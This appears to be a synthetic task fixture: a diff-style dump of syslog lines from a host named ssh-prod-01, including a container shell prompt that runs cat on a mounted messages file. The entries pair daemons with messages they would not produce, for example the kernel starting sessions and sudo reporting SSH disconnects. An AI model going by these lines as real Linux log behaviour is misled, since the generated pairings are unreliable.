+Aug 15 01:21:00 ssh-prod-01 kernel[28541]: pam_unix(cron:session): session opened for user root
+Aug 15 01:21:06 ssh-prod-01 sshd[21462]: Received disconnect from 10.10.105.42 port 62674:11: disconnected by user
+Aug 15 01:21:40 ssh-prod-01 systemd[16440]: pam_unix(cron:session): session opened for user root
+Aug 15 01:22:10 ssh-prod-01 kernel[23645]: CPU0: Package temperature normal
+Aug 15 01:22:26 ssh-prod-01 kernel[4998]: Time synchronised to time server
+Aug 15 01:22:48 ssh-prod-01 sudo[19011]: Received disconnect from 10.10.105.196 port 43742:11: disconnected by user
+Aug 15 01:22:50 ssh-prod-01 chronyd[5370]: pam_unix(cron:session): session opened for user root
+Aug 15 01:23:03 ssh-prod-01 chronyd[12230]: Started Session 798 of user postgres.
+Aug 15 01:23:16 ssh-prod-01 sshd[13471]: Started Session 807 of user jenkins.
+Aug 15 01:23:17 ssh-prod-01 sudo[6247]: pam_unix(cron:session): session opened for user root
+Aug 15 01:23:46 ssh-prod-01 systemd[29338]: pam_unix(cron:session): session opened for user root
+Aug 15 01:24:22 ssh-prod-01 sshd[27149]: pam_unix(cron:session): session opened for user root
+Aug 15 01:24:42 ssh-prod-01 sshd[21049]: Started Session 21 of user root.
+Aug 15 01:24:56 ssh-prod-01 dbus-daemon[15385]: Started Session 984 of user postgres.
+Aug 15 01:25:12 ssh-prod-01 chronyd[4755]: pam_unix(cron:session): session opened for user root
+Aug 15 01:25:59 ssh-prod-01 sudo[1548]: Received disconnect from 10.10.105.103 port 43292:11: disconnected by user
+Aug 15 01:26:16 ssh-prod-01 CRON[7005]: Time synchronised to time server
+Aug 15 01:26:19 ssh-prod-01 CRON[8100]: Time synchronised to time server
+Aug 15 01:26:27 ssh-prod-01 kernel[1944]: Started Session 929 of user postgres.
+Aug 15 01:26:40 ssh-prod-01 systemd[17865]: CPU0: Package temperature normal
+Aug 15 01:27:11 ssh-prod-01 dbus-daemon[23668]: Started Session 549 of user devops.
+Aug 15 01:27:41 ssh-prod-01 dbus-daemon[28527]: CPU0: Package temperature normal
+Aug 15 01:27:47 ssh-prod-01 dbus-daemon[17129]: Started Session 42 of user postgres.
+Aug 15 01:28:38 ssh-prod-01 CRON[10176]: Time synchronised to time server
+Aug 15 01:28:57 ssh-prod-01 kernel[1752]: CPU0: Package temperature normal
+Aug 15 01:29:04 ssh-prod-01 systemd-logind[26668]: Time synchronised to time server
+Aug 15 01:29:56 ssh-prod-01 systemd-logind[13714]: pam_unix(cron:session): session opened for user root
+Aug 15 01:30:29 ssh-prod-01 chronyd[17094]: Received disconnect from 10.10.105.130 port 49564:11: disconnected by user
+Aug 15 01:31:14 ssh-prod-01 CRON[16577]: CPU0: Package temperature normal
+Aug 15 01:31:52 ssh-prod-01 sshd[5238]: Time synchronised to time server
+Aug 15 01:32:32 ssh-prod-01 kernel[20513]: CPU0: Package temperature normal
+Aug 15 01:33:12 ssh-prod-01 systemd-logind[5549]: Received disconnect from 10.10.105.200 port 56197:11: disconnected by user
+Aug 15 01:33:26 ssh-prod-01 systemd[18473]: Time synchronised to time server
+Aug 15 01:33:41 ssh-prod-01 sudo[22023]: Started Session 425 of user root.
+Aug 15 01:33:42 ssh-prod-01 chronyd[12694]: pam_unix(cron:session): session opened for user root
+Aug 15 01:33:43 ssh-prod-01 dbus-daemon[21057]: Started Session 726 of user svc-backup.
+Aug 15 01:33:51 ssh-prod-01 systemd[13386]: pam_unix(cron:session): session opened for user root
+Aug 15 01:34:01 ssh-prod-01 systemd-logind[7489]: Received disconnect from 10.10.105.43 port 53141:11: disconnected by user
+Aug 15 01:34:47 ssh-prod-01 CRON[25145]: CPU0: Package temperature normal
+Aug 15 01:35:30 ssh-prod-01 sudo[3420]: Time synchronised to time server
+Aug 15 01:35:52 ssh-prod-01 systemd[7307]: Started Session 648 of user svc-backup.
+Aug 15 01:36:28 ssh-prod-01 dbus-daemon[19168]: Received disconnect from 10.10.105.57 port 47110:11: disconnected by user
+Aug 15 01:36:41 ssh-prod-01 systemd[12782]: Received disconnect from 10.10.105.90 port 52886:11: disconnected by user
+Aug 15 01:37:16 ssh-prod-01 dbus-daemon[3938]: Started Session 182 of user svc-backup.
+Aug 15 01:37:30 ssh-prod-01 systemd-logind[24759]: CPU0: Package temperature normal
+Aug 15 01:37:59 ssh-prod-01 systemd[20081]: Time synchronised to time server
+Aug 15 01:38:12 ssh-prod-01 sudo[5532]: CPU0: Package temperature normal
+Aug 15 01:38:42 ssh-prod-01 CRON[6255]: pam_unix(cron:session): session opened for user root
+Aug 15 01:39:01 ssh-prod-01 systemd-logind[7843]: Time synchronised to time server
+Aug 15 01:39:36 ssh-prod-01 kernel[18250]: CPU0: Package temperature normal
+Aug 15 01:40:05 ssh-prod-01 systemd-logind[13556]: Time synchronised to time server
+Aug 15 01:40:26 ssh-prod-01 sudo[2342]: CPU0: Package temperature normal
+Aug 15 01:41:21 ssh-prod-01 chronyd[9049]: Received disconnect from 10.10.105.110 port 64254:11: disconnected by user
+Aug 15 01:42:15 ssh-prod-01 chronyd[9855]: Started Session 549 of user webadmin.
+Aug 15 01:42:27 ssh-prod-01 chronyd[18692]: Time synchronised to time server
+Aug 15 01:43:09 ssh-prod-01 chronyd[12973]: Time synchronised to time server
+Aug 15 01:43:12 ssh-prod-01 systemd[22165]: pam_unix(cron:session): session opened for user root
+Aug 15 01:43:35 ssh-prod-01 systemd[17963]: CPU0: Package temperature normal
+Aug 15 01:44:30 ssh-prod-01 systemd[26618]: Received disconnect from 10.10.105.163 port 57243:11: disconnected by user
+Aug 15 01:45:25 ssh-prod-01 sshd[6947]: CPU0: Package temperature normal
+Aug 15 01:45:35 ssh-prod-01 systemd[1685]: Time synchronised to time server
+Aug 15 01:46:28 ssh-prod-01 CRON[27754]: Started Session 440 of user webadmin.
+Aug 15 01:47:05 ssh-prod-01 sudo[1185]: pam_unix(cron:session): session opened for user root
+Aug 15 01:47:59 ssh-prod-01 CRON[19864]: Received disconnect from 10.10.105.240 port 61987:11: disconnected by user
+Aug 15 01:48:19 ssh-prod-01 chronyd[9890]: pam_unix(cron:session): session opened for user root
+Aug 15 01:48:28 ssh-prod-01 CRON[11629]: CPU0: Package temperature normal
+Aug 15 01:48:34 ssh-prod-01 sshd[371]: CPU0: Package temperature normal
+Aug 15 01:48:50 ssh-prod-01 CRON[18884]: pam_unix(cron:session): session opened for user root
+Aug 15 01:49:39 ssh-prod-01 chronyd[24389]: Time synchronised to time server
+Aug 15 01:50:11 ssh-prod-01 dbus-daemon[10147]: CPU0: Package temperature normal
+Aug 15 01:50:44 ssh-prod-01 systemd-logind[28215]: Received disconnect from 10.10.105.86 port 40421:11: disconnected by user
+Aug 15 01:51:27 ssh-prod-01 chronyd[22655]: Time synchronised to time server
+Aug 15 01:52:20 ssh-prod-01 systemd-logind[21680]: CPU0: Package temperature normal
+Aug 15 01:52:47 ssh-prod-01 dbus-daemon[642]: Started Session 989 of user webadmin.
+Aug 15 01:53:35 ssh-prod-01 CRON[8961]: CPU0: Package temperature normal
+Aug 15 01:54:24 ssh-prod-01 chronyd[1638]: CPU0: Package temperature normal
+Aug 15 01:55:04 ssh-prod-01 systemd-logind[27071]: Received disconnect from 10.10.105.238 port 45330:11: disconnected by user
+Aug 15 01:55:26 ssh-prod-01 systemd-logind[22677]: Received disconnect from 10.10.105.29 port 49870:11: disconnected by user
+Aug 15 01:55:30 ssh-prod-01 kernel[12752]: Started Session 782 of user webadmin.
+Aug 15 01:55:56 ssh-prod-01 sudo[19839]: Time synchronised to time server
+Aug 15 01:56:33 ssh-prod-01 dbus-daemon[19470]: Started Session 633 of user devops.
+Aug 15 01:57:11 ssh-prod-01 systemd[24312]: CPU0: Package temperature normal
+Aug 15 01:57:15 ssh-prod-01 sudo[10513]: CPU0: Package temperature normal
+Aug 15 01:57:53 ssh-prod-01 dbus-daemon[17512]: pam_unix(cron:session): session opened for user root
+Aug 15 01:57:59 ssh-prod-01 chronyd[17590]: pam_unix(cron:session): session opened for user root
+Aug 15 01:58:50 ssh-prod-01 sudo[12388]: pam_unix(cron:session): session opened for user root
+Aug 15 01:59:20 ssh-prod-01 systemd-logind[10994]: pam_unix(cron:session): session opened for user root
+Aug 15 01:59:27 ssh-prod-01 chronyd[18294]: pam_unix(cron:session): session opened for user root
+Aug 15 01:59:56 ssh-prod-01 dbus-daemon[17910]: Received disconnect from 10.10.105.19 port 62306:11: disconnected by user
+Aug 15 02:00:14 ssh-prod-01 dbus-daemon[25914]: Time synchronised to time server
+Aug 15 02:01:06 ssh-prod-01 systemd-logind[3635]: Received disconnect from 10.10.105.186 port 48110:11: disconnected by user
+Aug 15 02:01:26 ssh-prod-01 sudo[17031]: Received disconnect from 10.10.105.216 port 54636:11: disconnected by user
+Aug 15 02:01:29 ssh-prod-01 dbus-daemon[28796]: Received disconnect from 10.10.105.73 port 63136:11: disconnected by user
+Aug 15 02:01:57 ssh-prod-01 chronyd[16961]: CPU0: Package temperature normal
+Aug 15 02:02:25 ssh-prod-01 sudo[10435]: Time synchronised to time server
+Aug 15 02:02:37 ssh-prod-01 kernel[17443]: Received disconnect from 10.10.105.203 port 62375:11: disconnected by user
+Aug 15 02:03:00 ssh-prod-01 dbus-daemon[9350]: CPU0: Package temperature normal
+Aug 15 02:03:15 ssh-prod-01 systemd[29126]: Time synchronised to time server
+Aug 15 02:03:41 ssh-prod-01 dbus-daemon[24428]: CPU0: Package temperature normal
+Aug 15 02:03:44 ssh-prod-01 sshd[5664]: CPU0: Package temperature normal
+Aug 15 02:04:20 ssh-prod-01 kernel[1497]: CPU0: Package temperature normal
+Aug 15 02:05:09 ssh-prod-01 systemd[21236]: CPU0: Package temperature normal
+Aug 15 02:05:54 ssh-prod-01 sshd[8527]: CPU0: Package temperature normal
+Aug 15 02:05:56 ssh-prod-01 sshd[7184]: CPU0: Package temperature normal
+Aug 15 02:06:21 ssh-prod-01 kernel[355]: Started Session 913 of user webadmin.
+Aug 15 02:06:25 ssh-prod-01 systemd[23461]: Time synchronised to time server
+Aug 15 02:06:42 ssh-prod-01 systemd-logind[24149]: Time synchronised to time server
+Aug 15 02:06:43 ssh-prod-01 sudo[25781]: Time synchronised to time server
+Aug 15 02:07:00 ssh-prod-01 sudo[11333]: pam_unix(cron:session): session opened for user root
+Aug 15 02:07:53 ssh-prod-01 kernel[21480]: CPU0: Package temperature normal
+Aug 15 02:07:54 ssh-prod-01 sshd[24737]: CPU0: Package temperature normal
+Aug 15 02:07:57 ssh-prod-01 kernel[471]: Time synchronised to time server
+Aug 15 02:08:08 ssh-prod-01 systemd[27200]: Started Session 876 of user root.
+Aug 15 02:08:23 ssh-prod-01 dbus-daemon[16184]: pam_unix(cron:session): session opened for user root
+Aug 15 02:08:32 ssh-prod-01 sudo[5902]: Time synchronised to time server
+Aug 15 02:09:17 ssh-prod-01 chronyd[17965]: Time synchronised to time server
+Aug 15 02:09:54 ssh-prod-01 systemd[19167]: CPU0: Package temperature normal
+Aug 15 02:10:15 ssh-prod-01 systemd[27555]: Started Session 939 of user postgres.
+Aug 15 02:10:26 ssh-prod-01 dbus-daemon[24691]: Started Session 551 of user svc-backup.
+Aug 15 02:10:58 ssh-prod-01 systemd-logind[9877]: pam_unix(cron:session): session opened for user root
+Aug 15 02:11:02 ssh-prod-01 sudo[25949]: Started Session 252 of user postgres.
+Aug 15 02:11:23 ssh-prod-01 systemd-logind[5239]: Received disconnect from 10.10.105.178 port 44556:11: disconnected by user
+Aug 15 02:11:35 ssh-prod-01 dbus-daemon[25338]: Started Session 737 of user root.
+Aug 15 02:12:19 ssh-prod-01 systemd-logind[26446]: CPU0: Package temperature normal
+Aug 15 02:12:27 ssh-prod-01 dbus-daemon[16364]: Received disconnect from 10.10.105.49 port 42267:11: disconnected by user
+Aug 15 02:12:47 ssh-prod-01 systemd-logind[11946]: Time synchronised to time server
+Aug 15 02:13:04 ssh-prod-01 systemd-logind[28900]: Started Session 863 of user svc-backup.
+Aug 15 02:13:39 ssh-prod-01 chronyd[26210]: pam_unix(cron:session): session opened for user root
+Aug 15 02:14:18 ssh-prod-01 systemd-logind[3742]: Received disconnect from 10.10.105.217 port 42209:11: disconnected by user
+Aug 15 02:14:49 ssh-prod-01 dbus-daemon[11038]: pam_unix(cron:session): session opened for user root
+Aug 15 02:15:14 ssh-prod-01 sshd[6498]: CPU0: Package temperature normal
+Aug 15 02:15:24 ssh-prod-01 kernel[29659]: CPU0: Package temperature normal
+Aug 15 02:16:06 ssh-prod-01 systemd[20125]: Time synchronised to time server
+Aug 15 02:16:13 ssh-prod-01 CRON[13371]: Started Session 602 of user devops.
+Aug 15 02:16:19 ssh-prod-01 systemd[27710]: Started Session 343 of user root.
+Aug 15 02:16:57 ssh-prod-01 systemd-logind[16065]: pam_unix(cron:session): session opened for user root
+Aug 15 02:17:37 ssh-prod-01 systemd[15494]: Time synchronised to time server
+Aug 15 02:18:27 ssh-prod-01 kernel[29140]: Time synchronised to time server
+Aug 15 02:18:46 ssh-prod-01 sudo[22120]: Time synchronised to time server
+Aug 15 02:19:25 ssh-prod-01 dbus-daemon[15165]: Time synchronised to time server
+Aug 15 02:19:48 ssh-prod-01 sshd[14184]: pam_unix(cron:session): session opened for user root
+Aug 15 02:20:37 ssh-prod-01 sshd[14076]: Started Session 549 of user webadmin.
+Aug 15 02:21:22 ssh-prod-01 systemd[861]: Time synchronised to time server
+[?2004hroot@58bb37a3cf48:/app# cat /disk/var/log/messages
+[?2004lAug 15 01:06:51 ssh-prod-01 systemd-logind[23634]: Time synchronised to time server
+Aug 15 01:07:13 ssh-prod-01 CRON[14024]: pam_unix(cron:session): session opened for user root
+Aug 15 01:08:00 ssh-prod-01 sshd[17369]: Started Session 204 of user jenkins.
+Aug 15 01:08:37 ssh-prod-01 sudo[28129]: Received disconnect from 10.10.105.64 port 55013:11: disconnected by user
+Aug 15 01:09:20 ssh-prod-01 sudo[20991]: Time synchronised to time server
+Aug 15 01:09:30 ssh-prod-01 dbus-daemon[20607]: Time synchronised to time server
+Aug 15 01:10:16 ssh-prod-01 sshd[25642]: Time synchronised to time server
+Aug 15 01:10:42 ssh-prod-01 sudo[27950]: pam_unix(cron:session): session opened for user root
+Aug 15 01:11:14 ssh-prod-01 dbus-daemon[25952]: Started Session 683 of user devops.
+Aug 15 01:11:55 ssh-prod-01 chronyd[22956]: pam_unix(cron:session): session opened for user root
+Aug 15 01:12:38 ssh-prod-01 sshd[18753]: Received disconnect from 10.10.105.74 port 58228:11: disconnected by user
+Aug 15 01:13:20 ssh-prod-01 dbus-daemon[21024]: Received disconnect from 10.10.105.93 port 54112:11: disconnected by user
+Aug 15 01:13:34 ssh-prod-01 chronyd[2111]: Received disconnect from 10.10.105.56 port 62151:11: disconnected by user
+Aug 15 01:14:08 ssh-prod-01 sudo[15417]: CPU0: Package temperature normal
+Aug 15 01:14:53 ssh-prod-01 systemd[19181]: pam_unix(cron:session): session opened for user root
+Aug 15 01:14:54 ssh-prod-01 systemd-logind[17978]: CPU0: Package temperature normal
+Aug 15 01:15:45 ssh-prod-01 CRON[12695]: pam_unix(cron:session): session opened for user root
+Aug 15 01:16:16 ssh-prod-01 systemd-logind[18451]: pam_unix(cron:session): session opened for user root
+Aug 15 01:16:38 ssh-prod-01 systemd-logind[5332]: Time synchronised to time server
+Aug 15 01:17:27 ssh-prod-01 CRON[29561]: pam_unix(cron:session): session opened for user root
+Aug 15 01:18:14 ssh-prod-01 kernel[1219]: Time synchronised to time server
+Aug 15 01:18:26 ssh-prod-01 systemd[12709]: Started Session 476 of user postgres.
+Aug 15 01:18:45 ssh-prod-01 systemd[13628]: Received disconnect from 10.10.105.56 port 50215:11: disconnected by user
+Aug 15 01:19:07 ssh-prod-01 sudo[16291]: CPU0: Package temperature normal
+Aug 15 01:19:13 ssh-prod-01 sshd[16278]: Time synchronised to time server
+Aug 15 01:19:14 ssh-prod-01 kernel[23597]: CPU0: Package temperature normal
+Aug 15 01:19:50 ssh-prod-01 dbus-daemon[15516]: CPU0: Package temperature normal
+Aug 15 01:20:30 ssh-prod-01 CRON[23035]: Time synchronised to time server
+Aug 15 01:21:07 ssh-prod-01 CRON[20806]: pam_unix(cron:session): session opened for user root
+Aug 15 01:22:02 ssh-prod-01 sudo[25474]: pam_unix(cron:session): session opened for user root
+Aug 15 01:22:21 ssh-prod-01 kernel[13422]: Started Session 602 of user devops.
+Aug 15 01:22:44 ssh-prod-01 sudo[9646]: pam_unix(cron:session): session opened for user root
+Aug 15 01:22:48 ssh-prod-01 chronyd[28256]: Received disconnect from 10.10.105.113 port 48755:11: disconnected by user
+Aug 15 01:23:14 ssh-prod-01 CRON[14948]: Received disconnect from 10.10.105.204 port 53764:11: disconnected by user
+Aug 15 01:23:17 ssh-prod-01 CRON[19050]: pam_unix(cron:session): session opened for user root
+Aug 15 01:24:06 ssh-prod-01 sshd[18027]: Time synchronised to time server
+Aug 15 01:24:50 ssh-prod-01 dbus-daemon[10741]: Time synchronised to time server
+Aug 15 01:25:33 ssh-prod-01 sudo[29324]: Time synchronised to time server
+Aug 15 01:26:01 ssh-prod-01 CRON[3826]: pam_unix(cron:session): session opened for user root
+Aug 15 01:26:41 ssh-prod-01 dbus-daemon[27123]: CPU0: Package temperature normal
+Aug 15 01:26:43 ssh-prod-01 systemd[19598]: Received disconnect from 10.10.105.157 port 58919:11: disconnected by user
+Aug 15 01:27:07 ssh-prod-01 kernel[27285]: CPU0: Package temperature normal
+Aug 15 01:27:16 ssh-prod-01 dbus-daemon[11319]: pam_unix(cron:session): session opened for user root
+Aug 15 01:28:09 ssh-prod-01 sudo[19059]: Started Session 679 of user postgres.
+Aug 15 01:29:04 ssh-prod-01 systemd[18887]: pam_unix(cron:session): session opened for user root
+Aug 15 01:29:42 ssh-prod-01 dbus-daemon[11800]: pam_unix(cron:session): session opened for user root
+Aug 15 01:29:53 ssh-prod-01 sudo[20857]: CPU0: Package temperature normal
+Aug 15 01:30:09 ssh-prod-01 CRON[15150]: Received disconnect from 10.10.105.237 port 56339:11: disconnected by user
+Aug 15 01:30:17 ssh-prod-01 sshd[27709]: Time synchronised to time server
+Aug 15 01:31:00 ssh-prod-01 systemd[20417]: CPU0: Package temperature normal
+Aug 15 01:31:12 ssh-prod-01 systemd[13225]: Started Session 583 of user root.
+Aug 15 01:31:47 ssh-prod-01 CRON[24134]: Time synchronised to time server
+Aug 15 01:32:01 ssh-prod-01 CRON[12140]: Started Session 416 of user devops.
+Aug 15 01:32:07 ssh-prod-01 sudo[29604]: Started Session 367 of user postgres.
+Aug 15 01:32:41 ssh-prod-01 chronyd[346]: Time synchronised to time server
+Aug 15 01:33:29 ssh-prod-01 CRON[21853]: CPU0: Package temperature normal
+Aug 15 01:33:42 ssh-prod-01 sudo[25798]: pam_unix(cron:session): session opened for user root
+Aug 15 01:34:24 ssh-prod-01 sshd[19994]: Time synchronised to time server
+Aug 15 01:34:35 ssh-prod-01 dbus-daemon[907]: pam_unix(cron:session): session opened for user root
+Aug 15 01:35:08 ssh-prod-01 sshd[25704]: Time synchronised to time server
+Aug 15 01:35:36 ssh-prod-01 sshd[24388]: Time synchronised to time server
+Aug 15 01:35:58 ssh-prod-01 CRON[20453]: pam_unix(cron:session): session opened for user root
+Aug 15 01:36:10 ssh-prod-01 kernel[6718]: CPU0: Package temperature normal
+Aug 15 01:36:40 ssh-prod-01 CRON[7113]: Time synchronised to time server
+Aug 15 01:36:52 ssh-prod-01 systemd-logind[5479]: Time synchronised to time server
+Aug 15 01:37:44 ssh-prod-01 sudo[14324]: Started Session 818 of user webadmin.
+Aug 15 01:37:49 ssh-prod-01 systemd[12555]: pam_unix(cron:session): session opened for user root
+Aug 15 01:38:09 ssh-prod-01 CRON[11251]: CPU0: Package temperature normal
+Aug 15 01:38:46 ssh-prod-01 dbus-daemon[29340]: CPU0: Package temperature normal
+Aug 15 01:39:07 ssh-prod-01 sudo[3577]: pam_unix(cron:session): session opened for user root
+Aug 15 01:39:46 ssh-prod-01 CRON[12551]: pam_unix(cron:session): session opened for user root
+Aug 15 01:40:01 ssh-prod-01 CRON[15743]: CPU0: Package temperature normal
+Aug 15 01:40:07 ssh-prod-01 dbus-daemon[17948]: pam_unix(cron:session): session opened for user root
+Aug 15 01:40:41 ssh-prod-01 chronyd[15294]: Time synchronised to time server
+Aug 15 01:41:21 ssh-prod-01 sshd[17648]: Time synchronised to time server
+Aug 15 01:41:32 ssh-prod-01 sshd[27748]: Time synchronised to time server
+Aug 15 01:41:40 ssh-prod-01 CRON[3224]: Started Session 427 of user jenkins.
+Aug 15 01:42:09 ssh-prod-01 systemd[2144]: Received disconnect from 10.10.105.5 port 53547:11: disconnected by user
+Aug 15 01:42:13 ssh-prod-01 sudo[18852]: pam_unix(cron:session): session opened for user root
+Aug 15 01:42:49 ssh-prod-01 systemd-logind[26166]: pam_unix(cron:session): session opened for user root
+Aug 15 01:42:57 ssh-prod-01 dbus-daemon[845]: Received disconnect from 10.10.105.133 port 48579:11: disconnected by user
+Aug 15 01:43:23 ssh-prod-01 kernel[12428]: CPU0: Package temperature normal
+Aug 15 01:43:42 ssh-prod-01 chronyd[20536]: pam_unix(cron:session): session opened for user root
+Aug 15 01:43:57 ssh-prod-01 dbus-daemon[7380]: pam_unix(cron:session): session opened for user root
+Aug 15 01:43:58 ssh-prod-01 dbus-daemon[25583]: Received disconnect from 10.10.105.152 port 60237:11: disconnected by user
+Aug 15 01:44:42 ssh-prod-01 dbus-daemon[19598]: Started Session 647 of user devops.
+Aug 15 01:45:15 ssh-prod-01 sshd[5573]: Started Session 706 of user postgres.
+Aug 15 01:46:04 ssh-prod-01 dbus-daemon[920]: Received disconnect from 10.10.105.218 port 64436:11: disconnected by user
+Aug 15 01:46:39 ssh-prod-01 sshd[4964]: Started Session 476 of user svc-backup.
+Aug 15 01:47:27 ssh-prod-01 chronyd[13340]: pam_unix(cron:session): session opened for user root
+Aug 15 01:48:22 ssh-prod-01 sshd[27443]: pam_unix(cron:session): session opened for user root
+Aug 15 01:48:27 ssh-prod-01 chronyd[3991]: Started Session 675 of user svc-backup.
+Aug 15 01:48:31 ssh-prod-01 sudo[17693]: Started Session 952 of user jenkins.
+Aug 15 01:49:17 ssh-prod-01 chronyd[6903]: Started Session 530 of user postgres.
+Aug 15 01:50:01 ssh-prod-01 systemd[17456]: Received disconnect from 10.10.105.154 port 53725:11: disconnected by user
+Aug 15 01:50:15 ssh-prod-01 sshd[23623]: Received disconnect from 10.10.105.51 port 57244:11: disconnected by user
+Aug 15 01:50:45 ssh-prod-01 sshd[17299]: CPU0: Package temperature normal
+Aug 15 01:51:19 ssh-prod-01 CRON[10140]: Started Session 250 of user root.
+Aug 15 01:51:34 ssh-prod-01 CRON[6836]: pam_unix(cron:session): session opened for user root
+Aug 15 01:52:20 ssh-prod-01 chronyd[18310]: Started Session 432 of user svc-backup.
+Aug 15 01:53:10 ssh-prod-01 dbus-daemon[2468]: Started Session 309 of user postgres.
+Aug 15 01:53:44 ssh-prod-01 systemd-logind[14494]: Time synchronised to time server
+Aug 15 01:53:47 ssh-prod-01 systemd[1611]: Started Session 883 of user devops.
+Aug 15 01:54:42 ssh-prod-01 sudo[12871]: pam_unix(cron:session): session opened for user root
+Aug 15 01:54:52 ssh-prod-01 systemd[11456]: Time synchronised to time server
+Aug 15 01:55:27 ssh-prod-01 sudo[15467]: Time synchronised to time server
+Aug 15 01:55:51 ssh-prod-01 systemd[26808]: Time synchronised to time server
+Aug 15 01:56:34 ssh-prod-01 systemd[377]: Received disconnect from 10.10.105.206 port 63110:11: disconnected by user
+Aug 15 01:57:02 ssh-prod-01 CRON[23414]: Started Session 136 of user webadmin.
+Aug 15 01:57:24 ssh-prod-01 systemd-logind[348]: CPU0: Package temperature normal
+Aug 15 01:57:55 ssh-prod-01 kernel[11789]: pam_unix(cron:session): session opened for user root
+Aug 15 01:57:56 ssh-prod-01 CRON[27538]: pam_unix(cron:session): session opened for user root
+Aug 15 01:58:39 ssh-prod-01 chronyd[13479]: pam_unix(cron:session): session opened for user root
+Aug 15 01:58:59 ssh-prod-01 dbus-daemon[8427]: Time synchronised to time server
+Aug 15 01:59:30 ssh-prod-01 sshd[7328]: CPU0: Package temperature normal
+Aug 15 02:00:25 ssh-prod-01 kernel[5465]: pam_unix(cron:session): session opened for user root
+Aug 15 02:01:14 ssh-prod-01 CRON[4356]: Started Session 789 of user webadmin.
+Aug 15 02:01:55 ssh-prod-01 systemd-logind[29796]: CPU0: Package temperature normal
+Aug 15 02:02:25 ssh-prod-01 CRON[15623]: pam_unix(cron:session): session opened for user root
+Aug 15 02:02:44 ssh-prod-01 dbus-daemon[2852]: CPU0: Package temperature normal
+Aug 15 02:03:28 ssh-prod-01 CRON[29845]: CPU0: Package temperature normal
+Aug 15 02:04:19 ssh-prod-01 kernel[7521]: Started Session 849 of user postgres.
+Aug 15 02:05:11 ssh-prod-01 CRON[2712]: Time synchronised to time server
+Aug 15 02:05:38 ssh-prod-01 sudo[3449]: Time synchronised to time server
+Aug 15 02:05:47 ssh-prod-01 CRON[7801]: pam_unix(cron:session): session opened for user root
+Aug 15 02:06:04 ssh-prod-01 sshd[25515]: pam_unix(cron:session): session opened for user root
+Aug 15 02:06:19 ssh-prod-01 systemd[27481]: Time synchronised to time server
+Aug 15 02:07:09 ssh-prod-01 CRON[27501]: Started Session 623 of user webadmin.
+Aug 15 02:07:46 ssh-prod-01 sshd[24111]: Received disconnect from 10.10.105.105 port 46733:11: disconnected by user
+Aug 15 02:08:19 ssh-prod-01 systemd[19877]: CPU0: Package temperature normal
+Aug 15 02:08:33 ssh-prod-01 dbus-daemon[13126]: Started Session 380 of user jenkins.
+Aug 15 02:09:15 ssh-prod-01 dbus-daemon[14028]: Started Session 940 of user postgres.
+Aug 15 02:09:31 ssh-prod-01 kernel[7714]: Started Session 589 of user postgres.
+Aug 15 02:10:17 ssh-prod-01 sudo[604]: CPU0: Package temperature normal
+Aug 15 02:10:29 ssh-prod-01 CRON[22373]: Received disconnect from 10.10.105.68 port 62978:11: disconnected by user
+Aug 15 02:10:46 ssh-prod-01 systemd[12025]: pam_unix(cron:session): session opened for user root
+Aug 15 02:11:33 ssh-prod-01 CRON[5283]: pam_unix(cron:session): session opened for user root
+Aug 15 02:12:04 ssh-prod-01 dbus-daemon[830]: pam_unix(cron:session): session opened for user root
+Aug 15 02:12:57 ssh-prod-01 systemd-logind[11852]: CPU0: Package temperature normal
+Aug 15 02:13:15 ssh-prod-01 sshd[7670]: pam_unix(cron:session): session opened for user root
+Aug 15 02:13:58 ssh-prod-01 dbus-daemon[11460]: CPU0: Package temperature normal
+Aug 15 02:14:46 ssh-prod-01 sudo[17971]: CPU0: Package temperature normal
+Aug 15 02:15:13 ssh-prod-01 sshd[12431]: CPU0: Package temperature normal
+Aug 15 02:15:14 ssh-prod-01 dbus-daemon[19205]: pam_unix(cron:session): session opened for user root
+Aug 15 02:15:15 ssh-prod-01 dbus-daemon[1706]: CPU0: Package temperature normal
+Aug 15 02:15:37 ssh-prod-01 systemd[28659]: Time synchronised to time server
+Aug 15 02:16:00 ssh-prod-01 sudo[11228]: Received disconnect from 10.10.105.27 port 49304:11: disconnected by user
+Aug 15 02:16:16 ssh-prod-01 dbus-daemon[29315]: pam_unix(cron:session): session opened for user root
+Aug 15 02:16:35 ssh-prod-01 dbus-daemon[10775]: pam_unix(cron:session): session opened for user root
+Aug 15 02:16:55 ssh-prod-01 systemd-logind[10509]: Time synchronised to time server
+Aug 15 02:17:33 ssh-prod-01 sshd[28069]: Started Session 105 of user root.
+Aug 15 02:18:11 ssh-prod-01 dbus-daemon[1949]: Received disconnect from 10.10.105.216 port 48683:11: disconnected by user
+Aug 15 02:18:25 ssh-prod-01 kernel[13456]: Started Session 395 of user svc-backup.
+Aug 15 02:18:34 ssh-prod-01 dbus-daemon[6306]: CPU0: Package temperature normal
+Aug 15 02:18:56 ssh-prod-01 CRON[26290]: Started Session 441 of user postgres.
+Aug 15 02:19:25 ssh-prod-01 chronyd[28368]: CPU0: Package temperature normal
+Aug 15 02:19:54 ssh-prod-01 sshd[24924]: Time synchronised to time server
+Aug 15 02:20:24 ssh-prod-01 sudo[15844]: CPU0: Package temperature normal
+Aug 15 02:20:55 ssh-prod-01 dbus-daemon[23695]: Started Session 881 of user root.
+Aug 15 02:21:45 ssh-prod-01 systemd-logind[4653]: Started Session 765 of user webadmin.
+Aug 15 02:22:05 ssh-prod-01 chronyd[10155]: Time synchronised to time server
+Aug 15 02:22:12 ssh-prod-01 kernel[27332]: pam_unix(cron:session): session opened for user root
+Aug 15 02:22:18 ssh-prod-01 sshd[3733]: Received disconnect from 10.10.105.121 port 62559:11: disconnected by user
+Aug 15 02:22:33 ssh-prod-01 kernel[12747]: CPU0: Package temperature normal
+Aug 15 02:22:49 ssh-prod-01 chronyd[25666]: Time synchronised to time server
+Aug 15 02:23:16 ssh-prod-01 CRON[10643]: Time synchronised to time server
+Aug 15 02:24:08 ssh-prod-01 kernel[9132]: Time synchronised to time server
+Aug 15 02:24:19 ssh-prod-01 sudo[15782]: Started Session 612 of user root.
+Aug 15 02:24:41 ssh-prod-01 sshd[9411]: Time synchronised to time server
+Aug 15 02:24:46 ssh-prod-01 sshd[4785]: CPU0: Package temperature normal
+Aug 15 02:24:50 ssh-prod-01 sshd[13780]: pam_unix(cron:session): session opened for user root
+Aug 15 02:25:03 ssh-prod-01 CRON[19149]: Time synchronised to time server
+Aug 15 02:25:58 ssh-prod-01 chronyd[24526]: pam_unix(cron:session): session opened for user root
+Aug 15 02:26:23 ssh-prod-01 sudo[20992]: Received disconnect from 10.10.105.60 port 63760:11: disconnected by user
